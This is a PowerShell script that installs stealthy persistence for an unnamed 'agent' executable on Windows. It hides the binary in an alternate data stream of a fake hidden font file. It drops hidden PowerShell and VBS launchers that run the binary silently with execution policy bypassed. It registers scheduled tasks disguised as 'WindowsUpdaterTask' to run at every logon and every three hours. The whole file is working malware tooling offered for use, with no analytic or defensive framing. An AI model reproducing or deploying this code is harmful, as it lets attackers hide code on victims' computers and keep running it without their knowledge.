$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'

param($args)

$agentPath = $env:AgentPath
if (-not $agentPath) {
    Write-Output "❌ AgentPath not set."
    exit
}

# ---- 1. Fake font file & ADS ----
$fontDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $fontDir)) {
    New-Item -ItemType Directory -Path $fontDir -Force | Out-Null
    attrib +h $fontDir
}
$fontFile = "$fontDir\seguibl.ttf"
if (-not (Test-Path $fontFile)) {
    Set-Content -Path $fontFile -Value "TTF fake font file - do not delete" -Encoding ASCII -Force
    attrib +h $fontFile
}

$streamName = "Zone.Identifier"
$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte

# ---- 2. Launcher scripts ----
$launcherPath = "$fontDir\run.ps1"
$launcherContent = @"
`$ProgressPreference = 'SilentlyContinue'
`$fontFile = '$fontFile'
`$streamName = '$streamName'
`$tempAgent = "`$env:TEMP\agent.exe"
if (Test-Path `$tempAgent) { Remove-Item `$tempAgent -Force -ErrorAction SilentlyContinue }
`$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
if (`$bytes) {
    [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
    `$env:AgentPath = `$tempAgent
    Start-Process -WindowStyle Hidden -FilePath `$tempAgent
}
"@
Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
attrib +h $launcherPath

$vbsPath = "$fontDir\run.vbs"
$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$launcherPath""", 0, False
"@
Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII -Force
attrib +h $vbsPath

# ---- 3. Scheduled tasks: logon + every 3 hours ----
$taskNameLogon = "WindowsUpdaterTask"
$taskNameHourly = "WindowsUpdaterTask3h"

# Delete old tasks if exist
schtasks /delete /tn $taskNameLogon /f 2>$null
schtasks /delete /tn $taskNameHourly /f 2>$null

# Task 1: At user logon
$cmdLogon = "schtasks /create /tn `"$taskNameLogon`" /tr `"wscript.exe `"$vbsPath`"`" /sc onlogon /ru `"$env:USERNAME`" /f /it"
Invoke-Expression $cmdLogon 2>$null
$ok1 = ($LASTEXITCODE -eq 0)

# Task 2: Every 3 hours (hourly with modifier 3)
$cmdHourly = "schtasks /create /tn `"$taskNameHourly`" /tr `"wscript.exe `"$vbsPath`"`" /sc hourly /mo 3 /ru `"$env:USERNAME`" /f /it"
Invoke-Expression $cmdHourly 2>$null
$ok2 = ($LASTEXITCODE -eq 0)

if ($ok1 -and $ok2) {
    Write-Output "✅ Persistence installed: runs at logon AND every 3 hours."
} elseif ($ok1) {
    Write-Output "⚠️ Only logon task created (3-hour task failed). Check permissions."
} elseif ($ok2) {
    Write-Output "⚠️ Only 3-hour task created (logon task failed)."
} else {
    Write-Output "❌ Both tasks failed. Run PowerShell as admin or check Task Scheduler."
}
